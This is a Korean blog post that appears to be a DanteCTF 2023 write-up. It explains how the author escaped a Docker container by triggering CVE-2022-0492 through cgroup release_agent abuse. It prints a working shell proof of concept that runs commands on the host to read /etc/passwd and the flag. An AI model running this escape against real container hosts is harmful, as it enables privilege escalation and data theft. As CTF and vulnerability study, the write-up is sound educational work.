---
layout: post
title: "[DanteCTF 2023] Infernal Break Write up"
date: 2023-06-06 01:40:00 +0900
categories: [Security, CTF]
tags: [CTF, linux, Container, pwnable]
media_subpath: /assets/img/20230606_dantectf_write-up
image: 0.png
---

## **Infernal Break**

### [0x00] 요약

---

CVE-2022-0492를 트리거함으로써 컨테이너 이스케이프를 수행하고, 이와 동시에 변경된 `/flag.txt`를 읽어내는 문제

### [0x01] 접근 방법

---

문제 제목이 Internal Escape(Infernal Break)이고, 태그가 Container로 달려 있어서 컨테이너 이스케이프 문제임을 알 수 있었다. 웬일로 컨테이너 이스케이프 문제가 CTF에 출제되었길래, 이건 내 전문 분야지 하고 집중해서 풀었다.

```bash
qemu-system-x86_64 -boot d -cdrom inferno.iso -m 2048 -cpu host -smp 2 --enable-kvm
```

문제에서 제시한 것은 `inferno.iso` 파일과 위 명령어로, 부팅 가능한 디스크를 활용해 커널을 부팅한다고 보시면 된다.

보통 커널 문제가 위와 같은 명령어로 부팅을 하는데, 이는 컨테이너 이스케이프를 하는데 커널 취약점을 이용한다는 힌트가 될 수 있다.

우선, 문제에서 제시한 환경을 그대로 실행했을 때, 어떤 출력이 나오는지 확인해보자. 그 다음에는 ISO 파일 내에 있는 것을 추출하여, 커널 취약점이 어떤 식으로 존재하는지 확인해보자.

![1](1.png)

먼저, 화면에 표시되는 내용은 위와 같다. CD/DVD 이미지를 사용하여 커널 부팅을 시작했고, 이후에는 커널 관련 정보를 출력해준다. 커널 부팅이 완료된 후에는 containerd, dockerd를 실행하고, ubuntu:23.04 컨테이너 이미지를 다운받은 뒤, 우리를 이 컨테이너 내부로 밀어 넣는다.

![4](4.png)

mount를 수행한 결과는 위와 같으며, 컨테이너 내부인데도 이상하게 루트 파일 시스템이 마운트된게 overlayfs가 아니라, rootfs이다. 이로 인해 처음에는 컨테이너 내부가 아닌 줄 알았고, 나중에 익스플로잇에도 조금 더 귀찮아진다.

또한, 커널 버전이 5.16.0([2022년 1월 10일 배포](https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/))으로, 최신 버전이 아닌 것을 알 수 있다. 이를 기준으로 커널 익스플로잇을 검색할 수도 있을 것이다.

이제 ISO 파일 내부에서 파일을 추출해보자.

```bash
sudo apt-get update
sudo apt-get -y install isomaster
```

나는 isomaster라는 툴을 이용했고, 이는 Unix 계열 운영체제에서 ISO 파일을 쉽게 수정하고 생성할 수 있게 해주는 툴이다. `isomaster inferno.iso`로 실행하면 아래 화면이 나온다.

![3](3.png)

이 상태에서, 아래 창에 있는 boot를 클릭한 뒤, extract 버튼을 누르면 boot 디렉토리를 현재 디렉토리로 가져올 수 있다. 이 디렉토리 내부에는 커널 부팅에 필수적인 `bzImage` 커널 이미지와 `initramfs` 루트 파일 시스템이 존재한다.

그리고 `initramfs`의 압축을 해제함으로써, 현재 루트 파일 시스템에는 어떤 파일들이 존재하며, init 스크립트는 어떤 식으로 존재하길래 이 커널은 실행과 동시에 도커 컨테이너에 진입하는지 알 수 있다.

압축 해제에는 `initramfs` 파일이 존재하는 위치에서 다음 스크립트를 사용하자.

```bash
zstd -d initramfs -o initramfs_uncompressed
mkdir fs && cd fs
cpio -idv < ../initramfs_uncompressed
```

그러면, 일련의 과정을 거쳐서 루트 파일 시스템이 어떤 식으로 생겼는지 확인할 수 있는데, 그중에서 `init` 스크립트는 다음과 같다.

```bash
#!/bin/sh

...

LOG_COLOR='\e[32m'
END_COLOR='\e[0m'
printf "${LOG_COLOR}[INFO]${END_COLOR}: Starting containerd\n"
containerd &> /dev/null &
sleep 3

printf "${LOG_COLOR}[INFO]${END_COLOR}: Starting dockerd\n"
DOCKER_RAMDISK=true dockerd &> /dev/null &
sleep 3

printf "${LOG_COLOR}[INFO]${END_COLOR}: Importing image\n"
docker load -i /opt/ubuntu-image.tar

printf "${LOG_COLOR}[INFO]${END_COLOR}: Welcome in hell!\n"
/usr/bin/docker run --rm -it -h inferno --security-opt seccomp=/etc/seccomp-profile.json ubuntu:23.04
exec /sbin/poweroff -f
```

위와 같이, 파일 시스템 내에 저장된 ubuntu-image.tar 파일로 컨테이너 이미지를 저장하고, 이를 기반으로 ubuntu:23.04 컨테이너를 실행한다.

![5](5.png)

그리고 무엇보다도, `flag.txt`가 루트 디렉토리 내에 존재하는데 이를 읽어도 플래그가 아니다..!

"실제 커널이 부팅된 환경이 아니어서 그런 건 아닐까?", "커널 부팅 시에 `flag.txt`가 달라지는 건 아닐까?" 그런 생각을 가지고 `init` 스크립트를 수정한 뒤 커널 부팅을 해 보는 나 같은 사람도 있겠다.

```bash
chmod 666 ../initramfs_uncompressed
find . | cpio -H newc -ov > ../initramfs_uncompressed
zstd -f ../initramfs_uncompressed -o ../initramfs
```

다시 압축을 할 때는 위 스크립트를 활용하면 되며, 생성된 `initramfs` 파일 시스템은 isomaster로 넣어주든가, `bzImage`와 `initramfs`를 부팅 시에 사용하도록 스크립트를 수정해도 되겠다.

```bash
#!/bin/bash
qemu-system-x86_64 -boot d -kernel ./boot/bzImage -initrd ./boot/initramfs -m 2048 -c
pu host -smp 2 --enable-kvm -append "console=ttyS0" -nographic
```

만약 `init` 스크립트의 도커 실행 부분을 `sh`로 바꿔서 쉘이 실행되게끔 해도, `flag.txt`는 여전히 플래그가 아닌 출력을 갖고 있음을 알 수 있다.

![6](6.png)

### [0x02] 분석

---

그렇다면, `/flag.txt`를 진짜 플래그로 바꾸는, 그러니까 실제로 컨테이너 이스케이프가 intended 하게 발생했을 때, 이를 탐지하고 정상적인 플래그로 덮어쓰는 로직이 어딘가 존재해야 한다.

![7](7.png)

현재 `init` 스크립트에는 그러한 로직이 존재하지 않고, `/bin` 폴더에는 출제자가 임의로 추가한 `write_on_file` 실행 파일이 보인다.

```bash
/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage > vmlinux
```

그렇다면, 이제 볼 것은 커널 로직이다. 커널의 실제 바이너리인 `vmlinux`를 `bzImage` 부팅 이미지 파일에서 추출하여, 이를 디컴파일한 뒤, `/flag.txt` 문자열을 사용하는 로직이 존재하는지 확인해 보자. 바이너리 추출은 위 명령어를 사용하면 된다.

![8](8.png)

그러면, 커널 내부 로직 중에 `/flag.txt`와 `/bin/write_on_file`을 사용하는 부분을 발견할 수 있다. 이 함수의 시작 주소를 보면 `sub_FFFFFFFF8111BAF0`임을 알 수 있고, 이 함수가 어떤 함수인지는 KASLR을 끈 상태로 `/proc/kallsyms`를 활용하여 알아볼 것이다.

```bash
#!/bin/bash
qemu-system-x86_64 -boot d -kernel ./boot/bzImage -initrd ./boot/initramfs -m 2048 -c
pu host -smp 2 --enable-kvm -append "console=ttyS0 nokaslr" -nographic
```

KASLR을 끄고 부팅하는 스크립트는 위와 같다.

![9](9.png)

자, `cgroup_release_agent_write` 함수가 `/flag.txt`를 수정하는 로직임을 알게 되었다. 그리고 이를 그대로 구글링하면, CVE-2022-0492가 연관된다는 것을 알 수 있고, 이는 컨테이너 이스케이프하는데 사용되는 취약점임을 확인할 수 있다. 이것이 정확히 어떤 취약점인지, cgroup이 어떤 것인지에 대한 블로그 포스팅은 추후에 올릴 것이고, 대충 Root Cause는 `cgroup_release_agent_write` 함수에서 `CAP_SYS_ADMIN` capability를 검사하지 않았기 때문에 발생하는 취약점이고, PoC는 아래와 같다.

```bash
unshare -UrmC bash
mkdir /tmp/mountest && mount -t cgroup -o rdma cgroup /tmp/mountest && mkdir /tmp/mountest/x
echo 1 > /tmp/mountest/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/mountest/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/passwd > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/mountest/x/cgroup.procs"
cat /output
```

여기서 문제는 `/etc/mtab`을 검색했을 때, 호스트 기준으로 도커 컨테이너의 루트 디렉토리 경로를 알 수 없다. 다시 말해, `mount` 명령어를 쳤을 때 맨 위에 나오는 값이 overlayfs가 아니라, rootfs이기 때문에 알 수 없는 것이다.

![10](10.png)

이는 Docker 컨테이너의 Storage Driver 설정이 `vfs`이기 때문에 발생하는 것으로, `/etc/docker/daemon.json`을 확인하거나, `docker info` 명령어로 현재 등록된 Storage Driver를 알 수 있다.

![11](11.png)

만약 이를 `overlay2`로 바꿔주고 다시 파일 시스템을 압축하면, 경로를 잘 구할 수 있음을 알 수 있다. 그렇다면, 위의 PoC 코드에서 읽는 파일만 수정해서 그대로 입력할 경우, 성공적으로 플래그를 읽어냄을 알 수 있다.

또한, 원래 `mount`와 `unshare` syscall은 `CAP_SYS_ADMIN`이 있어야만 사용 가능한 syscall이다. Default Seccomp Profile 설정이 그렇다.

그러나, `/etc/seccomp-profile.json`를 Seccomp Profile로 지정함으로써, `CAP_SYS_ADMIN`이 없어도 가능해졌다. 이로 인해, 실제로는 privileged 권한이 없어도, 임의로 `unshare` syscall을 통해 새로운 capability를 만들어 사용할 수 있고, 결과적으로 `cgroup` 파일 시스템을 새롭게 할당하여 CVE-2022-0492를 트리거할 수 있게 되는 것이다.

![13](13.png)

이에 대한 힌트는 `/etc/seccomp-profile.json`를 확인했을 때, 이 두 개의 syscall만 새롭게 추가된 것으로 확인할 수 있다.

### [0x03] 익스플로잇

---

```bash
unshare -UrmC bash
mkdir /tmp/mountest && mount -t cgroup -o rdma cgroup /tmp/mountest && mkdir /tmp/mountest/x
echo 1 > /tmp/mountest/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/mountest/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /flag.txt > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/mountest/x/cgroup.procs"
cat /output
```

또한, `vfs`를 Storage Driver로 지정하여 컨테이너의 주소를 구하려면, 컨테이너 주소 구하는 부분만 아래와 같이 수정하면 된다.

```bash
host_path=`cat /proc/self/mountinfo | head -n 1 | awk '{print $4}'`
```

![12](12.png)

`DANTE{Esc4P3_Fr0M_C0nT41n3R_thp4EDdgtf4}`

### [0x04] 참고 자료

---
- cgroup: [https://man7.org/linux/man-pages/man7/cgroups.7.html](https://man7.org/linux/man-pages/man7/cgroups.7.html)
- CVE-2022-0492
  - HackTricks: [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape)
  - Unit42: [https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
  - sysdig: [https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

- Docker Docs
  - seccomp profile: [https://docs.docker.com/engine/security/seccomp/](https://docs.docker.com/engine/security/seccomp/)
  - Storage Driver: [https://docs.docker.com/storage/storagedriver/select-storage-driver/](https://docs.docker.com/storage/storagedriver/select-storage-driver/)